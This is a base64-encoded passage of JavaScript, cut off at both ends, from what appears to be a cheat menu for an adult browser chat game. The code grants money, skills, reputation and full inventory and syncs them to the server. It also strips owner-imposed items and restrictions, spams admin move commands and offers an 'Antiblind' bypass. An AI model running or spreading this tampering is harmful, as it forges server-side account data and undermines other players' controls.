Q2hpbGQob3B0aW9uMyk7CnNlbGVjdC5hcHBlbmRDaGlsZChvcHRpb240KTsKc2VsZWN0LmFwcGVuZENoaWxkKG9wdGlvbjEyKTsKc2VsZWN0LmFwcGVuZENoaWxkKG9wdGlvbjUpOwpzZWxlY3QuYXBwZW5kQ2hpbGQob3B0aW9uNik7CnNlbGVjdC5hcHBlbmRDaGlsZChvcHRpb243KTsKc2VsZWN0LmFwcGVuZENoaWxkKG9wdGlvbjgpOwpzZWxlY3QuYXBwZW5kQ2hpbGQob3B0aW9uOSk7CnNlbGVjdC5hcHBlbmRDaGlsZChvcHRpb24xMCk7CnNlbGVjdC5hcHBlbmRDaGlsZChvcHRpb24xMSk7CnNlbGVjdC5hcHBlbmRDaGlsZChvcHRpb24xMyk7CnNlbGVjdC5hcHBlbmRDaGlsZChvcHRpb24xNCk7CnNlbGVjdC5hcHBlbmRDaGlsZChvcHRpb24xNik7CnNlbGVjdC5hcHBlbmRDaGlsZChvcHRpb24xNyk7CnNlbGVjdC5hcHBlbmRDaGlsZChvcHRpb24xOCk7CnNlbGVjdC5hcHBlbmRDaGlsZChvcHRpb24xOSk7CnNlbGVjdC5hcHBlbmRDaGlsZChvcHRpb24xNSk7CgoKCi8vIEJ1dHRvbiB0byBzaG93IHRoZSBkcm9wZG93biBtZW51CnZhciBkcm9wZG93bkJ1dHRvbiA9IGNyZWF0ZUJ1dHRvbigiUGVyc29uYWxpc2F0aW9uIiwgZnVuY3Rpb24oKSB7CiAgc2VsZWN0LnN0eWxlLmRpc3BsYXkgPSAiYmxvY2siOwp9KTsKLy9tYWtlIGJ1dHRvbiB0YWtlIG5vIHNwYWNlCmRyb3Bkb3duQnV0dG9uLnN0eWxlLm9wYWNpdHkgPSAiMCI7CmRyb3Bkb3duQnV0dG9uLnN0eWxlLnBvaW50ZXJFdmVudHMgPSAibm9uZSI7CmRyb3Bkb3duQnV0dG9uLnN0eWxlLnBvc2l0aW9uID0gImFic29sdXRlIjsKZHJvcGRvd25CdXR0b24uc3R5bGUudG9wID0gIi05OTk5cHgiOwpkcm9wZG93bkJ1dHRvbi5zdHlsZS5sZWZ0ID0gIi05OTk5cHgiOwpzZWxlY3QuYWRkRXZlbnRMaXN0ZW5lcigiY2xpY2siLCBmdW5jdGlvbihldmVudCkgewogIGV2ZW50LnN0b3BQcm9wYWdhdGlvbigpOyAKfSk7CgpzZWxlY3QuYWRkRXZlbnRMaXN0ZW5lcigiY2hhbmdlIiwgZnVuY3Rpb24oKSB7CiAgdmFyIHNlbGVjdGVkT3B0aW9uID0gc2VsZWN0Lm9wdGlvbnNbc2VsZWN0LnNlbGVjdGVkSW5kZXhdLnZhbHVlOwogIGlmIChzZWxlY3RlZE9wdGlvbiA9PT0gIm9wdDEiKSB7CiAgICBqYXZhc2NyaXB0OlBsYXllci5Nb25leSA9IDk5OTk5OTkKICAgIHNob3dUb2FzdHNjcGcoKTsKICAgIGV2ZW50LnN0b3BQcm9wYWdhdGlvbigpOwogICAgZXZlbnQuc3RvcFByb3BhZ2F0aW9uKCk7CiAgICBmb3JjZWNsb3NlbWVudSgpOwogIH0gZWxzZSBpZiAoc2VsZWN0ZWRPcHRpb24gPT09ICJvcHQyIikgewogICAgamF2YXNjcmlwdDpQbGF5ZXIuTW9uZXkgPSBwcm9tcHQoIkVudGVyIENhc2ggQW1vdW50Iik7CiAgICBzaG93VG9hc3RzY3BnKCk7CiAgICBmb3JjZWNsb3NlbWVudSgpOwogIH0gZWxzZSBpZiAoc2VsZWN0ZWRPcHRpb24gPT09ICJvcHQzIikgewogICAgamF2YXNjcmlwdDpTa2lsbENoYW5nZSgiSW5maWx0cmF0aW9uIiwgMTApOwogICAgU2tpbGxDaGFuZ2UoIlNlbGZCb25kYWdlIiwgMTApOwogICAgU2tpbGxDaGFuZ2UoIldpbGxwb3dlciIsIDEwKTsKICAgIFNraWxsQ2hhbmdlKCJFdmFzaW9uIiwgMTApOwogICAgU2tpbGxDaGFuZ2UoIkJvbmRhZ2UiLCAxMCk7CiAgICBTa2lsbENoYW5nZSgiRHJlc3NhZ2UiLCAxMCk7CiAgICBTa2lsbENoYW5nZSgiTG9ja1BpY2tpbmciLCAxMCk7CiAgICBzaG93VG9hc3RzY3BnKCk7CiAgICBmb3JjZWNsb3NlbWVudSgpOwogIH0gZWxzZSBpZiAoc2VsZWN0ZWRPcHRpb24gPT09ICJvcHQ0IikgewogICAgamF2YXNjcmlwdDpSZXB1dGF0aW9uQ2hhbmdlKCJHYW1pbmciLCAxMDApOwogICAgUmVwdXRhdGlvbkNoYW5nZSgiR2FtYmxpbmciLCAxMDApOwogICAgUmVwdXRhdGlvbkNoYW5nZSgiTEFSUCIsIDEwMCk7CiAgICBSZXB1dGF0aW9uQ2hhbmdlKCJNYWlkIiwgMTAwKTsKICAgIFJlcHV0YXRpb25DaGFuZ2UoIkFCREwiLCAxMDApOwogICAgUmVwdXRhdGlvbkNoYW5nZSgiTnVyc2UiLCAxMDApOwogICAgc2hvd1RvYXN0c2NwZygpOwogICAgZm9yY2VjbG9zZW1lbnUoKTsKICB9IGVsc2UgaWYgKHNlbGVjdGVkT3B0aW9uID09PSAib3B0NSIpIHsKICAgIGphdmFzY3JpcHQ6U2VydmVyUGxheWVyU3luYwogICAgQXNzZXRGZW1hbGUzRENHLmZvckVhY2goZ3JvdXA9Pmdyb3VwLkFzc2V0LmZvckVhY2goaXRlbT0+SW52ZW50b3J5QWRkKFBsYXllciwgaXRlbS5OYW1lLCBncm91cC5Hcm91cCkpKTsKICAgIFNlcnZlclBsYXllckludmVudG9yeVN5bmMoKTsKICAgIHNob3dUb2FzdHNjcGcoKTsKICAgIGZvcmNlY2xvc2VtZW51KCk7CiAgfSBlbHNlIGlmIChzZWxlY3RlZE9wdGlvbiA9PT0gIm9wdDYiKSB7CiAgICBqYXZhc2NyaXB0OkludmVudG9yeVJlbW92ZShQbGF5ZXIsICJJdGVtTmVjayIpOwogICAgQ2hhdFJvb21DaGFyYWN0ZXJJdGVtVXBkYXRlKFBsYXllciwgIkl0ZW1OZWNrIik7CiAgICBMb2dBZGQoIlJlbGVhc2VkQ29sbGFyIiwgIk93bmVyUnVsZSIpOyAKICAgIHNob3dUb2FzdHNjcGcoKTsKICAgIGZvcmNlY2xvc2VtZW51KCk7CiAgfSBlbHNlIGlmIChzZWxlY3RlZE9wdGlvbiA9PT0gIm9wdDciKSB7CiAgICBqYXZhc2NyaXB0OmFsZXJ0KCdTdGFydCBhIExBUlAgc2Vzc2lvbiAmIHNlbGVjdCBjbGFzcyBiZWZvcmUgcnVubmluZycpOwogICAgR2FtZUxBUlBMZXZlbFByb2dyZXNzKDEwMCkgCiAgICBzaG93VG9hc3RzY3BnKCk7CiAgICBmb3JjZWNsb3NlbWVudSgpOwogIH0gZWxzZSBpZiAoc2VsZWN0ZWRPcHRpb24gPT09ICJvcHQ4IikgewogICAgamF2YXNjcmlwdDpMb2dBZGQoIkVzY2FwZWQiLCAiQXN5bHVtIiwgQ3VycmVudFRpbWUgKyA5OTk5OTk5OTkpOwogICAgc2hvd1RvYXN0c2NwZygpOwogICAgZm9yY2VjbG9zZW1lbnUoKTsKICB9IGVsc2UgaWYgKHNlbGVjdGVkT3B0aW9uID09PSAib3B0OSIpIHsKICAgIGphdmFzY3JpcHQ6TG9nQWRkKCJDbHViU2xhdmUiLCAiTWFuYWdlbWVudCIsIEN1cnJlbnRUaW1lICsgOTk5OTk5OTk5KTsKICAgIHNob3dUb2FzdHNjcGcoKTsKICAgIGZvcmNlY2xvc2VtZW51KCk7CiAgfSBlbHNlIGlmIChzZWxlY3RlZE9wdGlvbiA9PT0gIm9wdDEwIikgewogICAgamF2YXNjcmlwdDpMb2dBZGQoIkVzY2FwZWQiLCAiQXN5bHVtIiwgQ3VycmVudFRpbWUpOwogICAgTG9nQWRkKCJDbHViU2xhdmUiLCAiTWFuYWdlbWVudCIsIEN1cnJlbnRUaW1lKTsKICAgIExvZ0FkZCgiQmxvY2tDaGFuZ2UiLCAiUnVsZSIsIEN1cnJlbnRUaW1lKTsKICAgIE1hbmFnZW1lbnRJc0NsdWJTbGF2ZSA9IGZ1bmN0aW9uKCkgewogICAgcmV0dXJuIGZhbHNlCiAgICB9CiAgICBNYW5hZ2VtZW50Q2x1YlNsYXZlRGlhbG9nID0gZnVuY3Rpb24oUGxheWVyKSB7fQogICAgTWFuYWdlbWVudEZpbmlzaENsdWJTbGF2ZSgpCiAgICBzaG93VG9hc3RzY3BnKCk7CiAgICBmb3JjZWNsb3NlbWVudSgpOwogIH0gZWxzZSBpZiAoc2VsZWN0ZWRPcHRpb24gPT09ICJvcHQxMSIpIHsKICAgIGphdmFzY3JpcHQ6YWxlcnQoJ1N0YXJ0IGEgR0dUUyBzZXNzaW9uIGJlZm9yZSBydW5uaW5nLCByZWZyZXNoIHRvIHNlZSBjaGFuZ2VzJyk7CiAgICBQbGF5ZXIuR2FtZS5HR1RTLkxldmVsID0gcHJvbXB0KCJFbnRlciBHR1RTIExldmVsICgxLTYpIik7OwogICAgU2VydmVyQWNjb3VudFVwZGF0ZS5RdWV1ZURhdGEoewogICAgR2FtZTogUGxheWVyLkdhbWUKICAgIH0pOwogICAgc2hvd1RvYXN0c2NwZygpOwogICAgZm9yY2VjbG9zZW1lbnUoKTsKICAgIAogIH1lbHNlIGlmIChzZWxlY3RlZE9wdGlvbiA9PT0gIm9wdDEyIikgewogICAgamF2YXNjcmlwdDpEaWFsb2dTZXRSZXB1dGF0aW9uKCJEb21pbmFudCIsIHByb21wdCgiRW50ZXIgU3ViL0RvbSBSZXAgKC0xMDAgdG8gMTAwKSIpKTsKICAgIHNob3dUb2FzdHNjcGcoKTsKICAgIGZvcmNlY2xvc2VtZW51KCk7CiAgfWVsc2UgaWYgKHNlbGVjdGVkT3B0aW9uID09PSAib3B0MTMiKSB7CiAgICBqYXZhc2NyaXB0Om5hbWUgPSBwcm9tcHQoIkVudGVyIE5pY2tuYW1lIik7OwogICAgUGxheWVyLk5pY2tuYW1lID0gbmFtZTsKICAgIFNlcnZlckFjY291bnRVcGRhdGUuUXVldWVEYXRhKHsgTmlja25hbWU6IG5hbWUgfSwgdHJ1ZSk7ICAgCiAgICBzaG93VG9hc3RzY3BnKCk7CiAgICBmb3JjZWNsb3NlbWVudSgpOyAgCiAgfWVsc2UgaWYgKHNlbGVjdGVkT3B0aW9uID09PSAib3B0MTQiKSB7CiAgICBqYXZhc2NyaXB0OkFjdGl2aXR5U2V0QXJvdXNhbChQbGF5ZXIsIDEpOwogICAgQWN0aXZpdHlPcmdhc21QcmVwYXJlKFBsYXllciwgdHJ1ZSk7CiAgICBBY3Rpdml0eU9yZ2FzbUdhbWVSZXNpc3RDb3VudCA9IDE7CiAgICBzaG93VG9hc3RzY3BnKCk7CiAgICBmb3JjZWNsb3NlbWVudSgpOwogIH1lbHNlIGlmIChzZWxlY3RlZE9wdGlvbiA9PT0gIm9wdDE1IikgewogICAgamF2YXNjcmlwdDp3aW5kb3cub3BlbignaHR0cHM6Ly9kaXNjb3JkLmdnL3YzSkJqeVM0bXgnLCAnX2JsYW5rJyk7CiAgICBzaG93VG9hc3RzY3BnKCk7CiAgICBmb3JjZWNsb3NlbWVudSgpOwogIH1lbHNlIGlmIChzZWxlY3RlZE9wdGlvbiA9PT0gIm9wdDE2IikgewogICAgamF2YXNjcmlwdDooZnVuY3Rpb24oKSB7bGV0IGlucHV0ID0gcHJvbXB0KCJNYWxlIC8gRmVtYWxlIC8gTWl4ZWQiKTsKICAgIGxldCBwbGFjZWhvbGRlcjsKICAgIAogICAgaWYgKGlucHV0LnRvTG93ZXJDYXNlKCkgPT09ICJtYWxlIikgewogICAgICBwbGFjZWhvbGRlciA9ICJNIjsKICAgIH0gZWxzZSBpZiAoaW5wdXQudG9Mb3dlckNhc2UoKSA9PT0gIm1peGVkIikgewogICAgICBwbGFjZWhvbGRlciA9ICJYIjsKICAgIH0gZWxzZSB7CiAgICAgIHBsYWNlaG9sZGVyID0gIiI7CiAgICB9ICAKCiAgICAKICAgIENoYXRSb29tU3RhcnQocGxhY2Vob2xkZXIsICIiLCBudWxsLCBudWxsLCAiSW50cm9kdWN0aW9uIiwgQmFja2dyb3VuZHNUYWdMaXN0KTsKICB9KSgpOwogICAgc2hvd1RvYXN0c2NwZygpOwogICAgZm9yY2VjbG9zZW1lbnUoKTsKICB9ZWxzZSBpZiAoc2VsZWN0ZWRPcHRpb24gPT09ICJvcHQxNyIpIHsKICAgIGphdmFzY3JpcHQ6KGZ1bmN0aW9uKCkge2xldCBpbnB1dCA9IHByb21wdCgiU3RhcnQgYSBMQVJQIFJvb20gYXMgQWRtaW4gRmlyc3RcblN0YXJ0IC8gU2tpcCAvIE1peGVkIC8gU2h1ZmZsZSAvIFRlYW0gLyBXaW4gKGNvbG9yKSIpLnRvTG93ZXJDYXNlKCk7CgogICAgaWYgKGlucHV0ID09PSAic3RhcnQiKSB7CiAgICAgIFNlcnZlclNlbmQoIkNoYXRSb29tR2FtZSIsIHsgR2FtZVByb2dyZXNzOiAiU3RhcnQiIH0pOwogICAgfSBlbHNlIGlmIChpbnB1dCA9PT0gInNraXAiKSB7CiAgICAgIFNlcnZlclNlbmQoIkNoYXRSb29tR2FtZSIsIHsgR2FtZVByb2dyZXNzOiAiU2tpcCIgfSk7CiAgICB9IGVsc2UgaWYgKGlucHV0ID09PSAic2h1ZmZsZSIpIHsKICAgICAgU2VydmVyU2VuZCgiQ2hhdFJvb21BZG1pbiIsIHsgTWVtYmVyTnVtYmVyOiBDaGF0Um9vbUNoYXJhY3RlclsxXS5NZW1iZXJOdW1iZXIsIEFjdGlvbjogIlNodWZmbGUiIH0pOwogICAgfSBlbHNlIGlmIChpbnB1dCA9PT0gInRlYW0iKSB7CiAgICAgIGNvbnN0IERpY3Rpb25hcnkgPSBuZXcgRGljdGlvbmFyeUJ1aWxkZXIoKQogICAgICAuc291cmNlQ2hhcmFjdGVyKFBsYXllcikKICAgICAgLmJ1aWxkKCk7CiAgICBTZXJ2ZXJTZW5kKCJDaGF0Um9vbUNoYXQiLCB7IENvbnRlbnQ6ICJMQVJQQ2hhbmdlVGVhbUNsYXNzIiwgVHlwZTogIkFjdGlvbiIsIERpY3Rpb25hcnk6IERpY3Rpb25hcnkgfSk7CiAgfSBlbHNlIGlmIChpbnB1dC5zdGFydHNXaXRoKCJ3aW4iKSkgewogICAgICBsZXQgY29sb3IgPSBpbnB1dC5zbGljZSg0KS50cmltKCk7CiAgICAgIGNvbG9yID0gY29sb3IuY2hhckF0KDApLnRvVXBwZXJDYXNlKCkgKyBjb2xvci5zbGljZSgxKTsKICAgICAgR2FtZUxBUlBBZGRDaGF0TG9nKCJFbmRHYW1lIiwgUGxheWVyLCBQbGF5ZXIsIE9ubGluZUdhbWVEaWN0aW9uYXJ5VGV4dCgiVGVhbSIgKyBjb2xvciksIDAsIDAsICIjMDAwMEIwIik7CiAgICB9CiAgfSkoKTsKCiAgICBzaG93VG9hc3RzY3BnKCk7CiAgICBmb3JjZWNsb3NlbWVudSgpOwogIH1lbHNlIGlmIChzZWxlY3RlZE9wdGlvbiA9PT0gIm9wdDE4IikgewogIGRvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYnV0dG9uQ29udGFpbmVyKTsKICBidXR0b25Db250YWluZXIuc3R5bGUuZGlzcGxheSA9ICJibG9jayI7CiAgfWVsc2UgaWYgKHNlbGVjdGVkT3B0aW9uID09PSAib3B0MTkiKSB7CiAgICBkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKHNldHRpbmdzTWVudSk7CiAgICBzZXR0aW5nc01lbnUuc3R5bGUuZGlzcGxheSA9ICJibG9jayI7CiAgICBzaG93VG9hc3RzY3BnKCk7CiAgICBmb3JjZWNsb3NlbWVudSgpOwogIH0KICAKCiAgLy8gSGlkZSBkZCBtZW51CiAgc2VsZWN0LnN0eWxlLmRpc3BsYXkgPSAibm9uZSI7Cn0pOwoKLy9FbmQgb2YgREQgbWVudV9fX19fX19fX19fX19fX19fX19fX19fX19fX19fCgoKZnVuY3Rpb24gdXBkYXRlQ29udGV4dE1lbnUoKSB7CiAgd2hpbGUgKGNvbnRleHRNZW51LmZpcnN0Q2hpbGQpIHsKICAgIGNvbnRleHRNZW51LnJlbW92ZUNoaWxkKGNvbnRleHRNZW51LmZpcnN0Q2hpbGQpOwogIH0KICBjb250ZXh0TWVudS5hcHBlbmRDaGlsZChoZWFkZXIpOwogIGNvbnRleHRNZW51LmFwcGVuZENoaWxkKGNyZWF0ZVNlcGFyYXRvcigpKTsKICBjb250ZXh0TWVudS5hcHBlbmRDaGlsZChidXR0b24xKTsKICBjb250ZXh0TWVudS5hcHBlbmRDaGlsZChidXR0b24yKTsKICBjb250ZXh0TWVudS5hcHBlbmRDaGlsZChidXR0b24zKTsKICBjb250ZXh0TWVudS5hcHBlbmRDaGlsZChidXR0b240KTsKICBjb250ZXh0TWVudS5hcHBlbmRDaGlsZChidXR0b241KTsKICBjb250ZXh0TWVudS5hcHBlbmRDaGlsZChidXR0b242KTsKICBjb250ZXh0TWVudS5hcHBlbmRDaGlsZChidXR0b243KTsKICBpZiAodmlzYikgewogICAgY29udGV4dE1lbnUuYXBwZW5kQ2hpbGQoYnV0dG9uOCk7CiAgfSBlbHNlIHsKICAgIGNvbnRleHRNZW51LmFwcGVuZENoaWxkKGJ1dHRvbjkpOwogIH0KICBjb250ZXh0TWVudS5hcHBlbmRDaGlsZChidXR0b24xMCk7CiAgLy8gQWRkIHRoZSBkZCBtZW51IHRvIHRoZSBjb250ZXh0IG1lbnUKICBjb250ZXh0TWVudS5hcHBlbmRDaGlsZChjcmVhdGVTZXBhcmF0b3IoKSk7CiAgY29udGV4dE1lbnUuYXBwZW5kQ2hpbGQoZHJvcGRvd25CdXR0b24pOwogIGNvbnRleHRNZW51LmFwcGVuZENoaWxkKHNlbGVjdCk7CiAgCn0KdXBkYXRlQ29udGV4dE1lbnUoKTsKLy8gRXZlbnQgbGlzdGVuZXIgdG8gdXBkYXRlIHRoZSBtZW51IHdoZW4gb3BlbmVkCmNvbnRleHRNZW51LmFkZEV2ZW50TGlzdGVuZXIoJ2NvbnRleHRtZW51JywgZnVuY3Rpb24oKSB7CiAgdXBkYXRlQ29udGV4dE1lbnUoKTsKfSk7CmRvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoY29udGV4dE1lbnUpOwp9KTsKCi8vIEhpZGUgdGhlIGN1c3RvbSBjb250ZXh0IG1lbnUKZG9jdW1lbnQuYWRkRXZlbnRMaXN0ZW5lcigiY2xpY2siLCBmdW5jdGlvbigpIHsKICAgIGlmIChjb250ZXh0TWVudU9wZW4pIHsKICAgICAgICB2YXIgY29udGV4dE1lbnUgPSBkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCJkaXZbc3R5bGUqPSdmaXhlZCddIik7CiAgICAgICAgaWYgKGNvbnRleHRNZW51KSB7CiAgICAgICAgICAgIGNvbnRleHRNZW51LnN0eWxlLmRpc3BsYXkgPSAibm9uZSI7CiAgICAgICAgICAgIENoYXRSb29tQ2xpY2tDaGFyYWN0ZXIoUGxheWVyKTsKICAgICAgICAgICAgRGlhbG9nTGVhdmUoKTsKICAgICAgICB9CiAgICAgICAgY29udGV4dE1lbnVPcGVuID0gZmFsc2U7CiAgICB9Cn0pOwoKCi8vU3RhcnQgb2Yga2V5Ym9hcmQgc2hvcnRjdXRzX19fX19fX19fX19fX19fX19fXwoKbGV0IGJhY2t0aWNrUHJlc3NlZCA9IGZhbHNlOwpsZXQgbGFzdEtleVByZXNzZWQgPSBudWxsOwoKZG9jdW1lbnQuYWRkRXZlbnRMaXN0ZW5lcigia2V5ZG93biIsIGZ1bmN0aW9uKGV2ZW50KSB7CiAgaWYgKGV2ZW50LmtleSA9PT0gImAiICYmICFiYWNrdGlja1ByZXNzZWQpIHsKICAgIGJhY2t0aWNrUHJlc3NlZCA9IHRydWU7CiAgfQogIGVsc2UgaWYgKGJhY2t0aWNrUHJlc3NlZCkgewogICAgbGFzdEtleVByZXNzZWQgPSBldmVudC5rZXk7CiAgfQp9KTsKCmRvY3VtZW50LmFkZEV2ZW50TGlzdGVuZXIoImtleXVwIiwgZnVuY3Rpb24oZXZlbnQpIHsKICBpZiAoZXZlbnQua2V5ID09PSAiYCIpIHsKICAgIGJhY2t0aWNrUHJlc3NlZCA9IGZhbHNlOwogICAgbGFzdEtleVByZXNzZWQgPSBudWxsOwogIH0KfSk7CgpzZXRJbnRlcnZhbChmdW5jdGlvbigpIHsKICBpZiAobGFzdEtleVByZXNzZWQgPT09ICIsIiB8fCBsYXN0S2V5UHJlc3NlZCA9PT0gIi4iKSB7CiAgICBsZXQgYWN0aW9uID0gbGFzdEtleVByZXNzZWQgPT09ICIsIiA/ICJNb3ZlTGVmdCIgOiAiTW92ZVJpZ2h0IjsKICAgIFNlcnZlclNlbmQoIkNoYXRSb29tQWRtaW4iLCB7CiAgICAgIE1lbWJlck51bWJlcjogUGxheWVyLk1lbWJlck51bWJlciwKICAgICAgQWN0aW9uOiBhY3Rpb24sCiAgICB9KTsKICB9Cn0sIDUwKTsKLy9TdGFydCBvZiBQZXJzaXN0YW50IE1lbnUgX19fX19fX19fX19fX19fX19fX19fCgpjb25zdCBzZXR0aW5nc01lbnUgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJkaXYiKTsKc2V0dGluZ3NNZW51LmlkID0gInNldHRpbmdzLW1lbnUiOwpzZXR0aW5nc01lbnUuc3R5bGUucG9zaXRpb24gPSAiZml4ZWQiOwpzZXR0aW5nc01lbnUuc3R5bGUudG9wID0gIjIwcHgiOwpzZXR0aW5nc01lbnUuc3R5bGUubGVmdCA9ICIyMHB4IjsKc2V0dGluZ3NNZW51LnN0eWxlLmJhY2tncm91bmRDb2xvciA9ICIjZmZmIjsKc2V0dGluZ3NNZW51LnN0eWxlLmJvcmRlciA9ICIxcHggc29saWQgI2NjYyI7CnNldHRpbmdzTWVudS5zdHlsZS5wYWRkaW5nID0gIjNweCI7CnNldHRpbmdzTWVudS5zdHlsZS5ib3JkZXJSYWRpdXMgPSAiMTBweCI7CnNldHRpbmdzTWVudS5zdHlsZS5kaXNwbGF5ID0gIm5vbmUiOwpzZXR0aW5nc01lbnUuc3R5bGUuekluZGV4ID0gIjk5OTkiOwoKLy9CQ00gbG9nbyAgIApjb25zdCBCQ01FbG9nbzEgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJpbWciKTsKQkNNRWxvZ28xLnNyYyA9ICJodHRwczovL21lZGlhLmRpc2NvcmRhcHAubmV0L2F0dGFjaG1lbnRzLzc4MTc0OTIyOTMzMTkzOTMyOC8xMDc5NjU5MDE2OTE5MTk1NzQ4L2I2NjQxOTExNzg5N2E5ODgucG5nP3dpZHRoPTExOTAmaGVpZ2h0PTExODkiOwpCQ01FbG9nbzEuc3R5bGUuZmxvYXQgPSAibGVmdCI7CkJDTUVsb2dvMS5zdHlsZS5tYXJnaW5SaWdodCA9ICIxMHB4IjsKQkNNRWxvZ28xLnN0eWxlLndpZHRoID0gIjQwcHgiOyAKQkNNRWxvZ28xLnN0eWxlLmhlaWdodCA9ICI0MHB4IjsgCnNldHRpbmdzTWVudS5hcHBlbmRDaGlsZChCQ01FbG9nbzEpOwoKLy9PcHRpb25zIGFuZCBzdHlsZV9fX19fX19fX19fX19fX19fX19fX19fX19fX19fCgpjb25zdCBvcHRpb24xID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgibGFiZWwiKTsKb3B0aW9uMS50ZXh0Q29udGVudCA9ICJBbnRpYmxpbmQiOwpjb25zdCBjaGVja2JveDEgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJpbnB1dCIpOwpjaGVja2JveDEudHlwZSA9ICJjaGVja2JveCI7CmNoZWNrYm94MS5pZCA9ICJvcHRpb24xIjsKY2hlY2tib3gxLnN0eWxlLm1hcmdpblJpZ2h0ID0gIjVweCI7CmNoZWNrYm94MS5zdHlsZS52ZXJ0aWNhbEFsaWduID0gIm1pZGRsZSI7Cm9wdGlvbjEuYXBwZW5kQ2hpbGQoY2hlY2tib3gxKTsKc2V0dGluZ3NNZW51LmFwcGVuZENoaWxkKG9wdGlvbjEpOwoKY29uc3Qgb3B0aW9uMiA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImxhYmVsIik7Cm9wdGlvbjIudGV4dENvbnRlbnQgPSAiUmVhbGlzdGljIFRhbGtpbmciOwpjb25zdCBjaGVja2JveDIgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJpbnB1dCIpOwpjaGVja2JveDIudHlwZSA9ICJjaGVja2JveCI7CmNoZWNrYm94Mi5pZCA9ICJvcHRpb24yIjsKY2hlY2tib3gyLnN0eWxlLm1hcmdpblJpZ2h0ID0gIjVweCI7CmNoZWNrYm94Mi5zdHlsZS52ZXJ0aWNhbEFsaWduID0gIm1pZGRsZSI7Cm9wdGlvbjIuYXBwZW5kQ2hpbGQoY2hlY2tib3gyKTsKc2V0dGluZ3NNZW51LmFwcGVuZENoaWxkKG9wdGlvbjIpOwoKY29uc3Qgb3B0aW9uMyA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImxhYmVsIik7Cm9wdGlvbjMudGV4dENvbnRlbnQgPSAiU291bmQiOwpjb25zdCBjaGVja2JveDMgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJpbnB1dCIpOwpjaGVja2JveDMudHlwZSA9ICJjaGVja2JveCI7CmNoZWNrYm94My5pZCA9ICJvcHRpb24zIjsKY2hlY2tib3gzLnN0eWxlLm1hcmdpblJpZ2h0ID0gIjVweCI7CmNoZWNrYm94My5zdHlsZS52ZXJ0aWNhbEFsaWduID0gIm1pZGRsZSI7Cm9wdGlvbjMuYXBwZW5kQ2hpbGQoY2hlY2tib3gzKTsKc2V0dGluZ3NNZW51LmFwcGVuZENoaWxkKG9wdGlvbjMpOwoKb3B0aW9uMS5zdHlsZS5kaXNwbGF5ID0gImZsZXgiOwpvcHRpb24xLnN0eWxlLmp1c3RpZnlDb250ZW50ID0gImNlbnRlciI7Cm9wdGlvbjEuc3R5bGUuYWxpZ25JdGVtcyA9ICJjZW50ZXIiOwpvcHRpb24xLnN0eWxlLm1hcmdpbkJvdHRvbSA9ICIxMHB4IjsKb3B0aW9uMS5zdHlsZS5wYWRkaW5nID0gIjVweCI7Cm9wdGlvbjEuc3R5bGUuYm9yZGVyUmFkaXVzID0gIjVweCI7Cm9wdGlvbjEuc3R5bGUuYmFja2dyb3VuZENvbG9yID0gIiNmMmYyZjIiOwoKb3B0aW9uMi5zdHlsZS5kaXNwbGF5ID0gImZsZXgiOwpvcHRpb24yLnN0eWxlLmp1c3RpZnlDb250ZW50ID0gImNlbnRlciI7Cm9wdGlvbjIuc3R5bGUuYWxpZ25JdGVtcyA9ICJjZW50ZXIiOwpvcHRpb24yLnN0eWxlLm1hcmdpbkJvdHRvbSA9ICIxMHB4IjsKb3B0aW9uMi5zdHlsZS5wYWRkaW5nID0gIjVweCI7Cm9wdGlvbjIuc3R5bGUuYm9yZGVyUmFkaXVzID0gIjVweCI7Cm9wdGlvbjIuc3R5bGUuYmFja2dyb3VuZENvbG9yID0gIiNmMmYyZjIiOwoKb3B0aW9uMy5zdHlsZS5kaXNwbGF5ID0gImZsZXgiOwpvcHRpb24zLnN0eWxlLmp1c3RpZnlDb250ZW50ID0gImNlbnRlciI7Cm9wdGlvbjMuc3R5bGUuYWxpZ25JdGVtcyA9ICJjZW50ZXIiOwpvcHRpb24zLnN0eWxlLm1hcmdpbkJvdHRvbSA9ICIxMHB4IjsKb3B0aW9uMy5zdHlsZS5wYWRkaW5nID0gIjVweCI7Cm9wdGlvbjMuc3R5bGUuYm9yZGVyUmFkaXVzID0gIjVweCI7Cm9wdGlvbjMuc3R5bGUuYmFja2dyb3VuZENvbG9yID0gIiNmMmYyZjIiOwoKb3B0aW9uMS5hZGRFdmVudExpc3RlbmVyKCJtb3VzZWVudGVyIiwgZnVuY3Rpb24oKSB7CiAgb3B0aW9uMS5zdHlsZS5iYWNrZ3JvdW5kQ29sb3IgPSAiI2RkZCI7CiAgb3B0aW9uMS5zdHlsZS5jdXJzb3IgPSAicG9pbnRlciI7Cn0pOwoKb3B0aW9uMS5hZGRFdmVudExpc3RlbmVyKCJtb3VzZWxlYXZlIiwgZnVuY3Rpb24oKSB7CiAgaWYgKGNoZWNrYm94MS5jaGVja2VkKSB7CiAgICBvcHRpb24xLnN0eWxlLmJhY2tncm91bmRDb2xvciA9ICJsaWdodGdyZWVuIjsKICB9IGVsc2UgewogICAgb3B0aW9uMS5zdHlsZS5iYWNrZ3JvdW5kQ29sb3IgPSAiI2YyZjJmMiI7CiAgfQp9KTsKCm9wdGlvbjIuYWRkRXZlbnRMaXN0ZW5lcigibW91c2VlbnRlciIsIGZ1bmN0aW9uKCkgewogIG9wdGlvbjIuc3R5bGUuYmFja2dyb3VuZENvbG9yID0gIiNkZGQiOwogIG9wdGlvbjIuc3R5bGUuY3Vyc29yID0gInBvaW50ZXIiOwp9KTsKCm9wdGlvbjIuYWRkRXZlbnRMaXN0ZW5lcigibW91c2VsZWF2ZSIsIGZ1bmN0aW9uKCkgewogIGlmIChjaGVja2JveDIuY2hlY2tlZCkgewogICAgb3B0aW9uMi5zdHlsZS5iYWNrZ3JvdW5kQ29sb3IgPSAibGlnaHRncmVlbiI7CiAgfSBlbHNlIHsKICAgIG9wdGlvbjIuc3R5bGUuYmFja2dyb3VuZENvbG9yID0gIiNmMmYyZjIiOwogIH0KfSk7CgpvcHRpb24zLmFkZEV2ZW50TGlzdGVuZXIoIm1vdXNlZW50